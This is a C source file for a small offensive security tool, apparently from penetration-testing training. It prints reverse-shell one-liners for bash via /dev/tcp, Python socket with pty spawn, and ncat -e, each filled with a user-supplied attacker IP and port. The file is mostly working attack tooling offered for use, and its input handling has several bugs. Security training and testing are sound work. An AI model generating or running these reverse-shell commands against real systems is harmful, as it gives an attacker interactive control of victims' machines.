#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock.h>
//colors!!
#define C_RED     "\x1b[31m"
#define C_GREEN   "\x1b[32m"
#define C_YELLOW  "\x1b[33m"
#define C_WHITE   "\x1b[15m]"
#define C_BLUE    "\x1b[34m"
#define C_MAGENTA "\x1b[35m"
#define C_CYAN    "\x1b[36m"
#define C_RESET   "\x1b[0m"


#define MAX_BUFF 255

//Struct for IP details
struct ipDetails{
    char hostname[MAX_BUFF];
    int port;
}ipStruct;

char *replace_str(char *str, char *orin, char *rep);
char *replace_str(char *str, char *orig, char *rep)
{
  static char buffer[4096];
  char *p;

  if(!(p = strstr(str, orig)))  // Is 'orig' even in 'str'?
    return str;

  strncpy(buffer, str, p-str); // Copy characters from 'str' start to 'orig' st$
  buffer[p-str] = '\0';

  sprintf(buffer+(p-str), "%s%s", rep, p+strlen(orig));

  return buffer;
}

struct ShellStruct {
       char name[20];
       char command[255];
   }shells;

char replace_IPPORT(struct ipDetails, char *cmd);
char replace_IPPORT(struct ipDetails ipStruct, char *cmd){
    char *rep = replace_str(cmd, "{IP}", ipStruct.hostname);
    char intbuff[5];
    _itoa(ipStruct.port, intbuff, 10);
    rep = replace_str(rep, "{PORT}",intbuff );
    printf(C_GREEN "\n\n[+]\n%s\n\n" C_RESET, rep);
}


char replace_IPPORT1(struct ipDetails ipStruct, struct ShellStruct *shells, int choice);
char replace_IPPORT1(struct ipDetails ipStruct, struct ShellStruct *shells, int choice){
    char *cmd;
    cmd = shells[choice].command;
    char *rep = replace_str(cmd, "{IP}", ipStruct.hostname);
    char intbuff[5];
    _itoa(ipStruct.port, intbuff, 10);
    rep = replace_str(rep, "{PORT}",intbuff );
    printf(C_GREEN "[+] %s\n"C_RESET "\n%s\n\n",shells[choice].name, rep);
}


//Menu deceleration
int getMenu(void);
int getMenu(void){
    int selection;
    do{
        printf(C_RED "\n[+] Shell Menu [+]" C_RESET);
        printf("\n[-] 1: All");
        printf("\n[-] 2: Bash");
        printf("\n[-] 3: Python");
        printf("\n[-] 4: Netcat");
        printf("\n[-] Enter a number: ");

        char res[20];
        scanf("%s", &res, 1);
        int len = sizeof(*res)/sizeof(char);
        for(int i = 0; i < len; i++){
            if(!isdigit(res[i])){
                printf("\n\nPlease enter a Number!!\n\n");
            }
        selection = atoi(res);
        }
        
    }while ((selection < 1 || selection > 4));
    return selection;
}



int main(int argc, char* argv[]){

    //initilize structure with values
    struct ShellStruct shells_arr[] = {
        {"Bash", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
        {"Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"},
        {"Netcat", "ncat {IP} {PORT} -e /bin/bash"}
    };

    char *banner[] = {
C_RED "@@@@@@@   @@@@@@@@  @@@  @@@" C_GREEN "   @@@@@@@@@@    @@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  " C_BLUE "   @@@@@@ " C_RESET,  
C_RED "@@@@@@@@  @@@@@@@@  @@@  @@@" C_GREEN "   @@@@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@ " C_BLUE "  @@@@@@@@" C_RESET,  
C_RED "@@!  @@@  @@!       @@!  @@@" C_GREEN "   @@! @@! @@!  @@!  @@@  @@!  !@@  @@!       @@!  @@@ " C_BLUE "       @@@" C_RESET,  
C_RED "!@!  @!@  !@!       !@!  @!@" C_GREEN "   !@! !@! !@!  !@!  @!@  !@!  @!!  !@!       !@!  @!@ " C_BLUE "      @!@ " C_RESET,  
C_RED "@!@!!@!   @!!!:!    @!@  !@!" C_GREEN "   @!! !!@ @!@  @!@!@!@!  @!@@!@!   @!!!:!    @!@!!@!  " C_BLUE "     !!@  " C_RESET,  
C_RED "!!@!@!    !!!!!:    !@!  !!!" C_GREEN "   !@!   ! !@!  !!!@!!!!  !!@!!!    !!!!!:    !!@!@!   " C_BLUE "    !!:   " C_RESET,  
C_RED "!!: :!!   !!:       :!:  !!:" C_GREEN "   !!:     !!:  !!:  !!!  !!: :!!   !!:       !!: :!!  " C_BLUE "   !:!    " C_RESET,  
C_RED ":!:  !:!  :!:        ::!!:! " C_GREEN "   :!:     :!:  :!:  !:!  :!:  !:!  :!:       :!:  !:! " C_BLUE "  :!:     " C_RESET,  
C_RED "::   :::   :: ::::    ::::  " C_GREEN "   :::     ::   ::   :::   ::  :::   :: ::::  ::   ::: " C_BLUE "  :: :::::" C_RESET,  
C_RED " :   : :  : :: ::      :    " C_GREEN "    :      :     :   : :   :   :::  : :: ::    :   : : " C_BLUE "  :: : :::" C_RESET,
"\nCreated by Richard Jones @Mosse Cyber Security"};

    int loop;
    loop = sizeof(banner)/sizeof(banner[0]);
    //printf("Banner size: %i", loop);
    for(int i = 0; i < loop; i++){
        printf("%s\n", banner[i]);
    }

    // printf("Struct Test");
    // int shellCount = sizeof(shells_arr)/sizeof(shells_arr[0]);
    // //printf("Shell count: %i", shellCount);
    // for(int i = 0; i < shellCount; i++){
    //     printf("\nName: %s\nCommand:\n%s\n",shells_arr[i].name, shells_arr[i].command);
    // }
    
    // Check cmdargs for ip and port
    if (argc < 2) {
        printf(C_RED "\n[+] Usage: IP PORT (10.10.10.10 8888)\n\n" C_RESET);
        exit(0);
    }
    //Make a pointer to the host address
    char *ip = argv[1];
    //Get the IP in int format
    int port = atoi(argv[2]);
    //Add to structure just to test it
    struct ipDetails IPinfo;
    strcpy(IPinfo.hostname, ip);
    IPinfo.port =  port;
    
    //printf("Host: %s, Port: %i", IPinfo.hostname, IPinfo.port);
    
    //declare a int for the result of getMenu (int) returns void or int;
    int choice = getMenu();
    int arrSz;
    switch (choice){
        case 1:
        arrSz = sizeof(shells_arr)/sizeof(shells_arr[0]);
        for(int i = 0; i < arrSz; i++){
            replace_IPPORT1(IPinfo, shells_arr, i);
        }
        break;
        case 2:
        //Bash
           // replace_IPPORT(IPinfo, shells_arr[choice -2].command);
            replace_IPPORT1(IPinfo, shells_arr, choice -2);
        break;
        case 3:
        //Python
       // replace_IPPORT(IPinfo, shells_arr[choice -2].command);
        replace_IPPORT1(IPinfo, shells_arr, choice- 2);
        break;
        case 4:
        //Netcat
       // replace_IPPORT(IPinfo, shells_arr[choice -2].command);
        replace_IPPORT1(IPinfo, shells_arr, choice -2);
        break;
        default:
            printf("Unknown error");
            break;
        break;
    }

return 0;
}
